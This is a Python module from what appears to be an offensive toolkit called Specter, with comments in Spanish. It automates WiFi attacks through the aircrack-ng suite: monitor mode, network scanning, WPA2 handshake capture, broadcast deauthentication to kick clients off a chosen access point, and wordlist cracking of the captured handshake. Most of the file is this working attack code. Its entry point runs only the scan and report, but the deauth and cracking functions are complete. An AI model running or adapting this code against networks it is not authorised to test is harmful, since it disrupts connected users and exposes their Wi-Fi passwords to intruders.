"""
Specter — Modulo: Ataques WiFi
Tecnicas: modo monitor, captura de handshake WPA2, deauth, listado de redes.
Requiere: airmon-ng, airodump-ng, aireplay-ng, aircrack-ng (como root).
"""

import os
import time
import subprocess
from typing import Optional
from pathlib import Path

from utils.helpers import (
    banner, success, info, warning, error,
    print_table, run_command, timestamp, human_timestamp,
    ensure_dir, require_tools
)
from utils.logger import get_logger
from config import AIRMON_PATH, AIRCRACK_PATH, REPORTS_DIR, MONITOR_INTERFACE

log = get_logger("wifi")

CAPTURE_DIR = Path("/tmp/specter_wifi")


# ─── Modo monitor ─────────────────────────────────────────────────────────────

def enable_monitor(iface: str) -> Optional[str]:
    """Activa modo monitor en la interfaz dada. Retorna el nombre de la nueva iface."""
    info(f"Activando modo monitor en {iface}...")
    code, out, err = run_command(["sudo", AIRMON_PATH, "start", iface])
    if code != 0:
        error(f"No se pudo activar modo monitor: {err}")
        return None
    # airmon-ng nombra la nueva interfaz como wlan0mon o similar
    mon_iface = iface + "mon"
    success(f"Modo monitor activado: {mon_iface}")
    return mon_iface


def disable_monitor(iface: str) -> None:
    """Desactiva modo monitor."""
    info(f"Desactivando modo monitor en {iface}...")
    run_command(["sudo", AIRMON_PATH, "stop", iface])
    success("Modo monitor desactivado.")


# ─── Listado de redes WiFi ────────────────────────────────────────────────────

def scan_networks(mon_iface: str, duration: int = 15) -> list[dict]:
    """
    Escanea redes WiFi visibles usando airodump-ng.
    Retorna lista de redes encontradas.
    """
    ensure_dir(CAPTURE_DIR)
    prefix = str(CAPTURE_DIR / f"scan_{timestamp()}")

    info(f"Escaneando redes por {duration} segundos...")
    proc = subprocess.Popen(
        ["sudo", "airodump-ng", "--output-format", "csv", "-w", prefix, mon_iface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(duration)
    proc.terminate()
    proc.wait()

    # Parsear CSV generado por airodump-ng
    csv_file = Path(f"{prefix}-01.csv")
    if not csv_file.exists():
        warning("No se genero archivo CSV de escaneo.")
        return []

    return _parse_airodump_csv(csv_file)


def _parse_airodump_csv(csv_file: Path) -> list[dict]:
    """Parsea el CSV de airodump-ng y extrae info de APs."""
    networks = []
    try:
        lines = csv_file.read_text(errors="ignore").splitlines()
        in_ap_section = True
        for line in lines:
            if line.strip().startswith("Station MAC"):
                in_ap_section = False
                continue
            if not in_ap_section or not line.strip() or line.startswith("BSSID"):
                continue
            parts = [p.strip() for p in line.split(",")]
            if len(parts) >= 14:
                networks.append({
                    "bssid":   parts[0],
                    "channel": parts[3],
                    "enc":     parts[5],
                    "cipher":  parts[6],
                    "auth":    parts[7],
                    "power":   parts[8],
                    "essid":   parts[13],
                })
    except Exception as e:
        error(f"Error parseando CSV: {e}")
    return networks


# ─── Captura de handshake WPA2 ────────────────────────────────────────────────

def capture_handshake(mon_iface: str, bssid: str, channel: str, duration: int = 60) -> Optional[Path]:
    """
    Captura el handshake WPA2 de un AP objetivo.
    Opcionalmente envia deauth para forzar reconexion del cliente.
    Retorna path al archivo .cap si tiene exito.
    """
    ensure_dir(CAPTURE_DIR)
    prefix = str(CAPTURE_DIR / f"handshake_{bssid.replace(':', '')}_{timestamp()}")

    info(f"Capturando handshake de {bssid} en canal {channel}...")
    proc = subprocess.Popen(
        [
            "sudo", "airodump-ng",
            "--bssid", bssid,
            "--channel", channel,
            "--output-format", "cap",
            "-w", prefix,
            mon_iface,
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    # Enviar deauth despues de 5 segundos para forzar reconexion
    time.sleep(5)
    info("Enviando paquetes deauth para forzar reconexion...")
    deauth(mon_iface, bssid)

    time.sleep(duration)
    proc.terminate()
    proc.wait()

    cap_file = Path(f"{prefix}-01.cap")
    if cap_file.exists() and cap_file.stat().st_size > 0:
        success(f"Captura guardada: {cap_file}")
        return cap_file
    else:
        warning("No se capturo handshake. Intentar nuevamente o esperar mas tiempo.")
        return None


# ─── Deauth ───────────────────────────────────────────────────────────────────

def deauth(mon_iface: str, bssid: str, client: str = "FF:FF:FF:FF:FF:FF", count: int = 10) -> None:
    """Envia paquetes de deautenticacion al AP (broadcast por defecto)."""
    run_command(
        ["sudo", "aireplay-ng", "--deauth", str(count), "-a", bssid, "-c", client, mon_iface],
        timeout=15,
    )


# ─── Cracking de handshake ────────────────────────────────────────────────────

def crack_handshake(cap_file: Path, wordlist: str) -> Optional[str]:
    """
    Intenta crackear el handshake WPA2 con aircrack-ng y una wordlist.
    Retorna la contrasena si la encuentra.
    """
    if not Path(wordlist).exists():
        error(f"Wordlist no encontrada: {wordlist}")
        return None

    info(f"Crackeando handshake con wordlist: {wordlist}")
    code, out, err = run_command(
        ["sudo", AIRCRACK_PATH, "-w", wordlist, str(cap_file)],
        timeout=None,
    )
    if "KEY FOUND" in out:
        for line in out.splitlines():
            if "KEY FOUND" in line:
                key = line.split("[")[-1].replace("]", "").strip()
                success(f"Contrasena encontrada: {key}")
                return key
    else:
        warning("Contrasena no encontrada en la wordlist.")
    return None


# ─── Reporte ──────────────────────────────────────────────────────────────────

def save_report(networks: list[dict], output: Optional[str]) -> Path:
    ensure_dir(REPORTS_DIR)
    filename = output or str(REPORTS_DIR / f"wifi_{timestamp()}.md")
    path = Path(filename)

    lines = [
        "# Reporte de Escaneo WiFi",
        f"**Fecha:** {human_timestamp()}",
        "",
        "## Redes encontradas",
        "| ESSID | BSSID | Canal | Enc | Cipher | Auth | Potencia |",
        "|-------|-------|-------|-----|--------|------|----------|",
    ]
    for n in networks:
        lines.append(
            f"| {n['essid']} | {n['bssid']} | {n['channel']} | "
            f"{n['enc']} | {n['cipher']} | {n['auth']} | {n['power']} |"
        )
    lines.append("")

    path.write_text("\n".join(lines), encoding="utf-8")
    return path


# ─── Punto de entrada ─────────────────────────────────────────────────────────

def run(iface: Optional[str], verbose: bool = False, output: Optional[str] = None) -> None:
    if not require_tools("airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"):
        error("Instala aircrack-ng suite: sudo apt install aircrack-ng")
        return

    iface = iface or MONITOR_INTERFACE
    banner("WIFI — Ataques WiFi", f"Interfaz: {iface}")

    # Activar modo monitor
    mon_iface = enable_monitor(iface)
    if not mon_iface:
        return

    try:
        # Escanear redes
        networks = scan_networks(mon_iface)
        if networks:
            rows = [[n["essid"], n["bssid"], n["channel"], n["enc"], n["power"]] for n in networks]
            print_table("Redes WiFi detectadas", ["ESSID", "BSSID", "Canal", "Enc", "Potencia"], rows)
            report_path = save_report(networks, output)
            success(f"Reporte guardado en: {report_path}")
        else:
            warning("No se detectaron redes WiFi.")
    finally:
        disable_monitor(mon_iface)
